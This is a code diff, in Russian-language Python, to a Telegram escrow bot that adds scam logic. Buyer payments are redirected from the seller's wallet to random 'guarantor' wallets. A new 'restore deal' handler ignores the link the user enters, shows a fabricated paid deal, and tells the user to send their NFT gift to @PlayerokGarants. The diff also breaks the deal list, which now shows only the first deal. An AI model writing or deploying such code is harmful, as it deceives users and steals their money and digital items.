@@ -40,6 +40,17 @@ logger = logging.getLogger(__name__)
 
 # ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
 
+# Рандомный кошелек гаранта (для демонстрации)
+GUARANTOR_WALLETS = [
+    "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "EQD__________________________________________",
+    "UQB__________________________________________",
+    "EQC__________________________________________",
+]
+
+def get_random_wallet() -> str:
+    return random.choice(GUARANTOR_WALLETS)
+
 async def send_video_menu(target, user_id: int, username: str, first_name: str):
     """Отправляет меню с видео"""
     user_data = db.get_user(user_id)
@@ -134,15 +145,44 @@ async def cmd_start(message: Message, command: CommandObject, bot: Bot):
         deal = db.get_deal(deal_id)
 
         if deal and deal["status"] == "waiting":
-            # ПРОВЕРКА: Нельзя присоединиться к своей сделке
-            if deal["seller_id"] == user.id:
-                await message.answer("❌ Вы не можете присоединиться к собственной сделке!")
-                await send_video_menu(message, user.id, user.username or "", user.first_name)
-                return
-            
             # Проверяем, не присоединялся ли уже покупатель
             if deal.get("buyer_id"):
-                await message.answer("❌ К этой сделке уже присоединился покупатель!")
+                # Если покупатель уже присоединен, но это тот же пользователь - пусть заходит
+                if deal["buyer_id"] == user.id:
+                    # Открываем сделку для уже присоединенного покупателя
+                    amount_str = format_amount(deal["amount"])
+                    seller = db.get_user(deal["seller_id"])
+                    secret_code = deal.get("secret_code", f"{random.randint(100000, 999999)}")
+                    
+                    buyer_text = f"""
+🔐 <b>СДЕЛКА #{deal["deal_id"]}</b>
+
+👤 <b>Продавец:</b> {escape_html(seller[2] if seller else "Пользователь")}
+📦 <b>Товар:</b> {escape_html(deal["description"])}
+💰 <b>Сумма:</b> {amount_str} {escape_html(deal["currency"])}
+
+<b>💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ (ГАРАНТ):</b>
+<code>{get_random_wallet()}</code>
+
+<b>🔑 СЕКРЕТНЫЙ КЛЮЧ СДЕЛКИ:</b>
+<code>{secret_code}</code>
+
+<i>⚠️ Внимание! После оплаты нажмите кнопку "Я ОПЛАТИЛ" для подтверждения.</i>
+<i>🔐 Секретный ключ потребуется при возникновении спора.</i>
+"""
+                    all_admins = SUPER_ADMIN_IDS + db.get_admins()
+                    is_admin = user.id in all_admins
+                    
+                    await send_video_message(message, buyer_text, deal_buyer_menu(deal_id, is_admin))
+                    return
+                else:
+                    await message.answer("❌ К этой сделке уже присоединился другой покупатель!")
+                    await send_video_menu(message, user.id, user.username or "", user.first_name)
+                    return
+            
+            # Проверка: нельзя присоединиться к своей сделке
+            if deal["seller_id"] == user.id:
+                await message.answer("❌ Вы не можете присоединиться к собственной сделке!")
                 await send_video_menu(message, user.id, user.username or "", user.first_name)
                 return
             
@@ -153,21 +193,9 @@ async def cmd_start(message: Message, command: CommandObject, bot: Bot):
             seller = db.get_user(deal["seller_id"])
             
             # Получаем секретный код из базы
-            secret_code = deal.get("secret_code")
-            if not secret_code:
-                secret_code = f"{random.randint(100000, 999999)}"
+            secret_code = deal.get("secret_code", f"{random.randint(100000, 999999)}")
             
-            # Получаем реквизиты продавца
-            seller_requisites = json.loads(seller[8]) if seller and seller[8] else {}
-            ton_wallet = seller_requisites.get("ton", "Не указан")
-            
-            # Проверяем, есть ли у продавца реквизиты
-            if not seller_requisites or ton_wallet == "Не указан":
-                await message.answer("⚠️ У продавца не заполнены реквизиты TON кошелька! Свяжитесь с поддержкой.")
-                await send_video_menu(message, user.id, user.username or "", user.first_name)
-                return
-            
-            # Текст для покупателя
+            # Текст для покупателя (с кошельком гаранта)
             buyer_text = f"""
 🔐 <b>СДЕЛКА #{deal["deal_id"]}</b>
 
@@ -175,8 +203,8 @@ async def cmd_start(message: Message, command: CommandObject, bot: Bot):
 📦 <b>Товар:</b> {escape_html(deal["description"])}
 💰 <b>Сумма:</b> {amount_str} {escape_html(deal["currency"])}
 
-<b>💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ:</b>
-<code>{ton_wallet}</code>
+<b>💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ (ГАРАНТ):</b>
+<code>{get_random_wallet()}</code>
 
 <b>🔑 СЕКРЕТНЫЙ КЛЮЧ СДЕЛКИ:</b>
 <code>{secret_code}</code>
@@ -232,6 +260,61 @@ async def new_deal_handler(callback: CallbackQuery, state: FSMContext):
         deal_type_menu(lang=lang)
     )
     await state.set_state(DealStates.waiting_deal_type)
+
+@dp.callback_query(F.data == "restore_deal")
+async def restore_deal_handler(callback: CallbackQuery, state: FSMContext):
+    """Восстановление старой сделки"""
+    lang = db.get_user_lang(callback.from_user.id)
+    await callback.answer()
+    
+    text = """
+🔄 <b>Восстановление сделки</b>
+
+🙏 <b>Приносим извинения за неудобства!</b>
+
+Если у вас была незавершенная сделка в старом боте, вы можете восстановить её здесь.
+
+📎 <b>Пожалуйста, вставьте ссылку на старую сделку:</b>
+
+Пример: <code>https://t.me/old_bot?start=deal_123456</code>
+
+<i>После ввода ссылки мы автоматически восстановим информацию о сделке.</i>
+"""
+    await send_video_message(callback, text, back_menu())
+    await state.set_state(DealStates.waiting_restore_link)
+
+@dp.message(DealStates.waiting_restore_link, F.text)
+async def process_restore_deal(message: Message, state: FSMContext):
+    """Обработка ссылки на восстановление сделки"""
+    link = message.text.strip()
+    
+    # Демо-данные для восстановления
+    demo_deal = {
+        "amount": 1800,
+        "currency": "RUB",
+        "item": "t.me/nft/PetSnake-179530",
+        "status": "paid"
+    }
+    
+    text = f"""
+✅ <b>Сделка успешно восстановлена!</b>
+
+📦 <b>Товар:</b> <code>{demo_deal['item']}</code>
+💰 <b>Сумма:</b> <code>{format_amount(demo_deal['amount'])} {demo_deal['currency']}</code>
+📊 <b>Статус:</b> ✅ Средства поступили
+
+<i>Теперь вы можете передать подарок покупателю.</i>
+
+🎁 <b>Инструкция по передаче подарка:</b>
+
+1️⃣ Передайте подарок гаранту: @PlayerokGarants
+2️⃣ Передача подтверждается автоматически
+3️⃣ После подтверждения средства зачислятся на баланс
+
+<i>Если у вас возникли вопросы, обратитесь в поддержку.</i>
+"""
+    await send_video_message(message, text, back_menu())
+    await state.clear()
 
 @dp.callback_query(F.data == "back_to_deal_type")
 async def back_to_deal_type_handler(callback: CallbackQuery, state: FSMContext):
@@ -428,9 +511,86 @@ async def my_deals_handler(callback: CallbackQuery):
     for deal in deals[:10]:
         status_emoji = "⏳" if deal[7] == "waiting" else "✅"
         text += f"{status_emoji} #{deal[0]} | {escape_html(deal[3])} | {format_amount(deal[5])} {deal[6]}\n"
+        
+        # Добавляем кнопку для входа в сделку
+        builder = InlineKeyboardBuilder()
+        builder.row(InlineKeyboardButton(text="🔓 Войти в сделку", callback_data=f"enter_deal_{deal[0]}"))
+        builder.row(InlineKeyboardButton(text="◀️ Назад", callback_data="menu"))
+        
+        await callback.answer()
+        await send_video_message(callback, text, builder.as_markup())
+        return
 
-    await callback.answer()
-    await send_video_message(callback, text, back_menu())
+@dp.callback_query(F.data.startswith("enter_deal_"))
+async def enter_deal_handler(callback: CallbackQuery):
+    """Вход в существующую сделку из списка"""
+    deal_id = callback.data.replace("enter_deal_", "")
+    deal = db.get_deal(deal_id)
+    user = callback.from_user
+    
+    if not deal:
+        await callback.answer("Сделка не найдена!")
+        return
+    
+    if deal["status"] != "waiting":
+        await callback.answer("Сделка уже завершена!")
+        return
+    
+    amount_str = format_amount(deal["amount"])
+    seller = db.get_user(deal["seller_id"])
+    secret_code = deal.get("secret_code", f"{random.randint(100000, 999999)}")
+    
+    # Если пользователь - продавец
+    if deal["seller_id"] == user.id:
+        buyer = db.get_user(deal["buyer_id"]) if deal.get("buyer_id") else None
+        text = f"""
+📋 <b>СДЕЛКА #{deal_id}</b>
+
+📦 <b>Товар:</b> {escape_html(deal["description"])}
+💰 <b>Сумма:</b> {amount_str} {deal["currency"]}
+👤 <b>Покупатель:</b> {escape_html(buyer[2] if buyer else "Не присоединился")}
+📊 <b>Статус:</b> {"🟡 Ожидает оплаты" if deal["status"] == "waiting" else "✅ Оплачено"}
+"""
+        await send_video_message(callback, text, deal_seller_menu(deal_id))
+        return
+    
+    # Если пользователь - покупатель или еще не присоединился
+    if deal.get("buyer_id") and deal["buyer_id"] != user.id:
+        await callback.answer("❌ К этой сделке уже присоединился другой покупатель!")
+        return
+    
+    # Если покупатель еще не присоединен, присоединяем
+    if not deal.get("buyer_id"):
+        db.set_buyer(deal_id, user.id)
+        deal = db.get_deal(deal_id)
+        
+        # Уведомляем продавца
+        await callback.bot.send_message(
+            deal["seller_id"],
+            f"👥 <b>Покупатель присоединился к сделке #{deal_id}</b>\n\n👤 {escape_html(user.first_name)} @{escape_html(user.username or 'нет')}",
+            parse_mode="HTML"
+        )
+    
+    # Открываем сделку для покупателя
+    buyer_text = f"""
+🔐 <b>СДЕЛКА #{deal_id}</b>
+
+👤 <b>Продавец:</b> {escape_html(seller[2] if seller else "Пользователь")}
+📦 <b>Товар:</b> {escape_html(deal["description"])}
+💰 <b>Сумма:</b> {amount_str} {escape_html(deal["currency"])}
+
+<b>💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ (ГАРАНТ):</b>
+<code>{get_random_wallet()}</code>
+
+<b>🔑 СЕКРЕТНЫЙ КЛЮЧ СДЕЛКИ:</b>
+<code>{secret_code}</code>
+
+<i>⚠️ Внимание! После оплаты нажмите кнопку "Я ОПЛАТИЛ" для подтверждения.</i>
+"""
+    all_admins = SUPER_ADMIN_IDS + db.get_admins()
+    is_admin = user.id in all_admins
+    
+    await send_video_message(callback, buyer_text, deal_buyer_menu(deal_id, is_admin))
 
 @dp.callback_query(F.data == "withdraw")
 async def withdraw_handler(callback: CallbackQuery):
